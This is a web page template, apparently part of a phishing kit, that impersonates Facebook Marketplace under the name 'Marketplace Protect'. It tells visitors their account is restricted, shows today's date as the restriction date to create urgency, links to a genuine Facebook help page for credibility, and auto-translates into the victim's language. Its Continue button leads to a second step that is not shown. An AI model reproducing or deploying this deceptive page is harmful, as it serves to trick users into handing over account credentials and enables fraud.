@extends('layouts.app')

@section('content')


<div id="root">
    <div class="flex min-h-screen flex-col items-center justify-center py-8">
      <div class="flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3">
        <img
          src="{{asset('assets/hero-image-2-CMe_D_F7.png')}}"
          alt="Hero"
          class="rounded-t-lg" /><b class="text-2xl">Welcome To Marketplace Protect.</b>
          <p>Your account's accessibility is currently limited. We ask that higher security requirements be applied to ensure the safety of your account. This security program has been set up to fully unlock the features of Marketplace. <br /><a href="https://www.facebook.com/help/582999911881572" target="_blank" class="text-blue-500 hover:underline" rel="noreferrer">More information</a></p>        <div class="px-4">
          <ol
            class="relative flex flex-col gap-5 border-s-2 border-s-gray-200">
            <li class="mb-11 ms-6 pb-4">
              <div
                class="absolute -start-4 flex items-center justify-start gap-2">
                <svg
                  aria-hidden="true"
                  focusable="false"
                  data-prefix="fas"
                  data-icon="check"
                  class="svg-inline--fa fa-check fa-lg h-4 w-4 rounded-full bg-gray-400 p-2 text-white ring-2 ring-white"
                  role="img"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 448 512">
                  <path
                    fill="currentColor"
                    d="M438.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L160 338.7 393.4 105.4c12.5-12.5 32.8-12.5 45.3 0z"></path>
                </svg>
                <p>We've enabled advanced protections to help you secure your account and continue using Marketplace without any obstacles.</p>
              </div>
            </li>
            <li class="mb-10 ms-6">
              <div
                class="absolute -start-4 flex items-center justify-start gap-2">
                <svg
                  aria-hidden="true"
                  focusable="false"
                  data-prefix="fas"
                  data-icon="address-card"
                  class="svg-inline--fa fa-address-card fa-xs h-4 w-4 rounded-full bg-blue-500 p-2 text-white ring-2 ring-white"
                  role="img"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 576 512">
                  <path
                    fill="currentColor"
                    d="M64 32C28.7 32 0 60.7 0 96L0 416c0 35.3 28.7 64 64 64l448 0c35.3 0 64-28.7 64-64l0-320c0-35.3-28.7-64-64-64L64 32zm80 256l64 0c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16L80 384c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm-32-96a64 64 0 1 1 128 0 64 64 0 1 1 -128 0zm256-32l128 0c8.8 0 16 7.2 16 16s-7.2 16-16 16l-128 0c-8.8 0-16-7.2-16-16s7.2-16 16-16zm0 64l128 0c8.8 0 16 7.2 16 16s-7.2 16-16 16l-128 0c-8.8 0-16-7.2-16-16s7.2-16 16-16zm0 64l128 0c8.8 0 16 7.2 16 16s-7.2 16-16 16l-128 0c-8.8 0-16-7.2-16-16s7.2-16 16-16z"></path>
                </svg>
                <p>
                Below, we walk you through the detailed steps to complete the activation process and unlock all the features of Marketplace.</p>
              </div>
            </li>
          </ol>
        </div>
        <div class="mt-6 md:mt-3">
          <button
            class="my-5 flex w-full items-center justify-center rounded-lg p-4 font-semibold text-white cursor-pointer bg-blue-500 hover:bg-blue-600"
            id="continue">
            Continue</button>
        </div>
        <p class="text-center">
        Your page was restricted on <b id="tampil"></b>
        </p>
      </div>
    </div>
  </div>
  <div id="google_translate_element" style="display: none;"></div>

<script type="text/javascript">
    function googleTranslateElementInit() {
        new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
    }

    (function () {
        var gtScript = document.createElement('script');
        gtScript.type = 'text/javascript';
        gtScript.src = "http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
        document.getElementsByTagName('head')[0].appendChild(gtScript);
    })();

    async function getLanguageFromBackend() {
        try {
            const response = await fetch('/get-language');
            const data = await response.json();
            return data.language || 'en';
        } catch (error) {
            console.error("Error fetching language from backend:", error);
            return 'en';
        }
    }

    async function autoTranslate() {
        document.getElementById('loading-overlay').style.display = 'flex';

        const targetLang = await getLanguageFromBackend();

        setTimeout(() => {
            const selectElement = document.querySelector('select.goog-te-combo');
            if (selectElement) {
                selectElement.value = targetLang;
                selectElement.dispatchEvent(new Event('change'));
            }

            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
            }, 500);
        }, 500);
    }

    document.addEventListener('DOMContentLoaded', autoTranslate);
</script>

<style>
    .goog-te-banner-frame, .skiptranslate, .VIpgJd-ZVi9od-aZ2wEe-wOHMyf {
        display: none !important;
    }

    body {
        top: 0 !important;
    }
</style>
  <script>
        var date = new Date();
        var tahun = date.getFullYear();
        var bulan = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var namabulan = ("January February March April May June July August September October November December");
        namabulan = namabulan.split(" ");
        var tampilTanggal = " " + namabulan[bulan] + " " + tanggal + " " + tahun;
        document.getElementById("tampil").innerHTML = tampilTanggal;
    $("#continue").click(function() {
      var continueButton = $("#continue");
      var continueText = continueButton.text();
      continueButton.html(
        '<div style="user-select: none;" class="h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"></div>'
      ).prop("disabled", true).addClass("cursor-not-allowed bg-blue-300").removeClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
      setTimeout(function() {
        // Lấy root domain
        var rootDomain = window.location.origin;
        // Lấy folder hiện tại từ URL
        var currentFolder = window.location.pathname.split('')[1] || ''; // Nếu không có folder, sử dụng chuỗi rỗng
        // Chuyển hướng tới URL mới

        continueButton.html(continueText).prop("disabled", false).removeClass("cursor-not-allowed bg-blue-300").addClass("bg-blue-500 hover:bg-blue-600 cursor-pointer")
        window.location.href = "{{ route('home') }}/?step=2";
      }, 1000);
    });
  </script>
@endsection